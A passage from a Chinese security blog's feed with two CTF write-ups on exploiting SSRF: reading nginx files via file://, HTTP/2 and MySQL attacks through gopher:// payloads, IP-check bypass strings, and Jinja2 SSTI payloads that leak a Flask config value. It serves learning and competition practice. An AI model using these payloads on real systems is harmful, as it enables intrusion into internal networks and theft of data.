class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>先ssrf读nginx配置文件：</p><ul><li>/etc/nginx/nginx.conf</li><li>/etc/nginx/sites-enabled/default</li><li>/var/log/nginx/access.log;</li><li>/var/log/nginx/error.log</li></ul><p><code>view-source:https://40.73.33.181/index.php?url=file:///etc/nginx/sites-enabled/default</code></p><p><code>view-source:https://40.73.33.181/index.php?url=file:///etc/nginx/nginx.conf</code></p><pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">user</span> www<span class="token operator">-</span>data<span class="token punctuation">;</span><span class="token keyword">worker_processes</span> auto<span class="token punctuation">;</span><span class="token keyword">pid</span> <span class="token operator">/</span>run<span class="token operator">/</span>nginx<span class="token punctuation">.</span><span class="token keyword">pid</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>modules<span class="token operator">-</span>enabled<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span><span class="token keyword">events</span> <span class="token punctuation">{</span>    <span class="token keyword">worker_connections</span> <span class="token number">768</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># multi_accept on;</span><span class="token punctuation">}</span><span class="token keyword">http</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Basic Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">sendfile</span> on<span class="token punctuation">;</span>    <span class="token keyword">tcp_nopush</span> on<span class="token punctuation">;</span>    <span class="token keyword">tcp_nodelay</span> on<span class="token punctuation">;</span>    <span class="token keyword">keepalive_timeout</span> <span class="token number">65</span><span class="token punctuation">;</span>    <span class="token keyword">types_hash_max_size</span> <span class="token number">2048</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># server_tokens off;</span>    <span class="token comment" spellcheck="true"># server_names_hash_bucket_size 64;</span>    <span class="token comment" spellcheck="true"># server_name_in_redirect off;</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>mime<span class="token punctuation">.</span><span class="token keyword">types</span><span class="token punctuation">;</span>    <span class="token keyword">default_type</span> application<span class="token operator">/</span>octet<span class="token operator">-</span>stream<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># SSL Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">ssl_protocols</span> TLSv1 TLSv1<span class="token number">.1</span> TLSv1<span class="token number">.2</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true"># Dropping SSLv3, ref: POODLE</span>    <span class="token keyword">ssl_prefer_server_ciphers</span> on<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Logging Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">access_log</span> <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>access<span class="token punctuation">.</span>log<span class="token punctuation">;</span>    <span class="token keyword">error_log</span> <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>error<span class="token punctuation">.</span>log<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Gzip Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">gzip</span> on<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># gzip_vary on;</span>    <span class="token comment" spellcheck="true"># gzip_proxied any;</span>    <span class="token comment" spellcheck="true"># gzip_comp_level 6;</span>    <span class="token comment" spellcheck="true"># gzip_buffers 16 8k;</span>    <span class="token comment" spellcheck="true"># gzip_http_version 1.1;</span>    <span class="token comment" spellcheck="true"># gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Virtual Host Configs</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>conf<span class="token punctuation">.</span>d<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>sites<span class="token operator">-</span>enabled<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#server {</span>    <span class="token comment" spellcheck="true">#    listen 8080</span>    <span class="token comment" spellcheck="true">#    location /flag {</span>    <span class="token comment" spellcheck="true">#        proxy_pass 172.20.0.3:8080</span>    <span class="token comment" spellcheck="true">#    }</span>    <span class="token comment" spellcheck="true">#}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#mail {</span><span class="token comment" spellcheck="true">#    # See sample authentication script at:</span><span class="token comment" spellcheck="true">#    # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true">#    # auth_http localhost/auth.php;</span><span class="token comment" spellcheck="true">#    # pop3_capabilities "TOP" "USER";</span><span class="token comment" spellcheck="true">#    # imap_capabilities "IMAP4rev1" "UIDPLUS";</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true">#    server {</span><span class="token comment" spellcheck="true">#        listen     localhost:110;</span><span class="token comment" spellcheck="true">#        protocol   pop3;</span><span class="token comment" spellcheck="true">#        proxy      on;</span><span class="token comment" spellcheck="true">#    }</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true">#    server {</span><span class="token comment" spellcheck="true">#        listen     localhost:143;</span><span class="token comment" spellcheck="true">#        protocol   imap;</span><span class="token comment" spellcheck="true">#        proxy      on;</span><span class="token comment" spellcheck="true">#    }</span><span class="token comment" spellcheck="true">#}</span></code></pre><p>然后可以从nginx.conf得知flag线索<code>172.20.0.3:8080</code>，通过gopher协议构造符合HTTP2的payload访问指定地址，获取返回的HTTP2的原生数据（需要了解<a href="https://www.codercto.com/a/34433.html" target="_blank" rel="noopener">HTTP2</a>以及<a href="https://www.codercto.com/a/34433.html" target="_blank" rel="noopener">gopher协议</a>的知识）。</p><pre class=" language-payload"><code class="language-payload">--payload:/index.php?url=gopher://172.20.0.3:8080/_PRI%2520%252A%2520HTTP/2.0%250D%250A%250D%250ASM%250D%250A%250D%250A%2500%2500%2500%2504%2500%2500%2500%2500%2500%2500%2500%2515%2501%2505%2500%2500%2500%2501%2582%2586%2584A%258A%2508%259D%255C%250B%2581p%25DCx%250F%2503%2560%2581%25EFS%2581%25F9</code></pre><p>返回的数据:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190131000835.png" alt=""></p><p>可以将返回的数据按HTTP2协议的格式解析，或者利用一种巧妙的方法，即把返回数据放在使用socket模拟的服务器上，直接用<code>curl --http2-prior-knowledge</code>访问，获得写在返回头部<code>set-cookie</code>的flag：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: UTF-8 -*-</span><span class="token comment" spellcheck="true"># From F1sh's blog</span><span class="token keyword">import</span> socketa <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"response.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>host <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span>port <span class="token operator">=</span> <span class="token number">2333</span>s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    c<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'连接地址：'</span><span class="token punctuation">,</span> addr    c<span class="token punctuation">.</span>send<span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre><p>执行<code>curl -vv --http2-prior-knowledge 127.0.0.1:6777 --output -</code>返回的数据：</p><pre class=" language-response"><code class="language-response">* Rebuilt URL to: 127.0.0.1:6777/*   Trying 127.0.0.1...* TCP_NODELAY set* Connected to 127.0.0.1 (127.0.0.1) port 6777 (#0)* Using HTTP2, server supports multi-use* Connection state changed (HTTP/2 confirmed)* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0* Using Stream ID: 1 (easy handle 0x55d0f3f35520)> GET / HTTP/2> Host: 127.0.0.1:6777> User-Agent: curl/7.61.0> Accept: */*> * Connection state changed (MAX_CONCURRENT_STREAMS == 128)!< HTTP/2 200 < server: nginx/1.14.0 (Ubuntu)< date: Wed, 30 Jan 2019 16:02:53 GMT< content-type: text/html; charset=UTF-8< set-cookie: F1ag:flag{Http2_Mak3_a_Differ3nce}=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0< * Closing connection 0U hav3 g0t Me!!!%                  </code></pre><p>[+] GET==&gt; F1ag:flag{Http2_Mak3_a_Differ3nce}</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;……&lt;/p&gt;
    
    </summary>
    
      <category term="网络安全" scheme="http://www.yof3ng.xyz/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ssrf" scheme="http://www.yof3ng.xyz/tags/ssrf/"/>
    
      <category term="网络安全" scheme="http://www.yof3ng.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="write-up" scheme="http://www.yof3ng.xyz/tags/write-up/"/>
    
  </entry>
  
  <entry>
    <title>某入群题解题记录</title>
    <link href="http://www.yof3ng.xyz/2019/01/29/%E6%9F%90%E5%85%A5%E7%BE%A4%E9%A2%98%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://www.yof3ng.xyz/2019/01/29/某入群题解题记录/</id>
    <published>2019-01-29T13:58:02.000Z</published>
    <updated>2019-04-02T08:47:14.376Z</updated>
    
    <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="记某入群题解题过程"><a href="#记某入群题解题过程" class="headerlink" title="记某入群题解题过程"></a>记某入群题解题过程</h1><p>闲来无事，看众人纷纷在玩入群题，纵使我菜的不敢动手，也想尝试一下。</p><h2 id="0x01-迎面而来的SSRF"><a href="#0x01-迎面而来的SSRF" class="headerlink" title="0x01 迎面而来的SSRF"></a>0x01 迎面而来的SSRF</h2><p>首先访问题目地址：</p><p><code>index.php源码</code></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$match_result</span><span class="token operator">=</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$match_result</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">try</span>     <span class="token punctuation">{</span>         <span class="token variable">$url_parse</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token variable">$url_parse</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token variable">$ip</span><span class="token operator">=</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$hostname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$int_ip</span><span class="token operator">=</span><span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'127.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">||</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'10.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">||</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'172.16.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">20</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">20</span> <span class="token operator">||</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'192.168.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">16</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">16</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token variable">$url</span><span class="token punctuation">.</span><span class="token string">' is inner ip'</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">else</span>     <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$result_info</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>             <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre><p>意思是我们可以通过<code>http|https|gopher|dict</code>四种协议进行Curl操作，并且探测到的内容会通过<code>var_dump($output);</code>打印出来，但是它会对我们探测的ip地址进行check，看是否为内网地址（<a href="https://www.cnblogs.com/afanti/p/9928371.html" target="_blank" rel="noopener">可以进行bypass，这题的ssrf与上海大学生网安赛某春秋出的题有些许类似</a>）。</p><pre class=" language-php+HTML"><code class="language-php+HTML">payload1: ?url=http://127.0.0.1./flag.phppayload2: ?url=http://@127.0.0.1:80@baidu.com/flag.php</code></pre><p>原理：<a href="https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize(" target="_blank" rel="noopener">Some trick in ssrf and unserialize()</a>/#some-trick-in-unserialize)</p><h2 id="0x02-知道网段后肆无忌惮的内网探测"><a href="#0x02-知道网段后肆无忌惮的内网探测" class="headerlink" title="0x02 知道网段后肆无忌惮的内网探测"></a>0x02 知道网段后肆无忌惮的内网探测</h2><p><code>PS: 想写一个自动化的SSRF探测工具</code></p><p>通过bp的intruder模块，对内网网段的常用端口进行服务探测（172.11.243.0/24）：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190129211758.png" alt=""></p><p>可以得到<code>172.11.243.81:8080</code>和<code>172.11.243.218:3306</code>，分别为一个flask服务和mysql服务。</p><p>source code of flask service:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> flask<span class="token keyword">import</span> osapp <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'HINT'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'HINT'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> open<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/yulige/&lt;path:yulige>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">yulige</span><span class="token punctuation">(</span>yulige<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'{{% set {}=None%}}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>s    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>yulige<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span></code></pre><p>根据源码中出现的<code>flask.render_template_string</code>，可以知道这是考SSTI模板注入，但是这里对<code>(、)、config、self</code>进行了过滤，无法进行常规的操作，注意到<code>app.config[&#39;HINT&#39;] = os.environ.pop(&#39;HINT&#39;)</code>，可以想办法get到HINT的值，可以参考<a href="https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/" target="_blank" rel="noopener">从SSTI到沙箱逃逸-jinja2</a>。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#payload:{{url_for.__globals__[%27current_app%27].config[%27HINT%27]}}</span><span class="token comment" spellcheck="true">#payload:{{get_flashed_messages.__globals__[%27current_app%27].config[%27HINT%27]}}</span></code></pre><p>拿payload打一发后拿到了HINT里面的mysql用户名。</p><h2 id="0x03-拿到数据库名后对mysql的狂轰滥炸"><a href="#0x03-拿到数据库名后对mysql的狂轰滥炸" class="headerlink" title="0x03 拿到数据库名后对mysql的狂轰滥炸"></a>0x03 拿到数据库名后对mysql的狂轰滥炸</h2><p>注意到最开始允许我们使用的协议中包括<code>gopher</code>协议，通过<code>ssrf＋gopher</code>我们可以对未设置密码的mysql服务进行攻击，这里用到Github上面一个好东西<a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">Gopherus</a>。</p><p>列数据库名（依次类推，拿表名，拿列名，getflag）：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190129214016.png" alt=""></p><p>需要注意的是，我们是在打ssrf，通过跳板打内网，payload中的url编码需要进行二次编码才能正常发挥作用：</p><pre class=" language-payload"><code class="language-payload">url=gopher://172.11.243.218:3306/_%25ae%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2579%2575%256c%2569%2567%2565%2565%2565%2565%2531%2532%2533%2533%2532%2531%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%252c%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2566%256c%2561%2567%2520%2566%2572%256f%256d%2520%2566%256c%2561%2534%2534%2534%2531%2531%2531%2531%2567%252e%2546%2531%2531%2531%2531%256c%256c%256c%256c%2567%2567%2567%2567%2567%2501%2500%2500%2500%2501</code></pre><p>get flag：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190129214508.png" alt=""></p><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>环境和氛围，题目的质量，都能决定你自己的进步速度。当然，最重要的还是你自己的坚持和努力。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;……&lt;/p&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.yof3ng.xyz/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="SSRF" scheme="http://www.yof3ng.xyz/tags/SSRF/"/>
    
      <category term="内网" scheme="http://www.yof3ng.xyz/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
</feed>
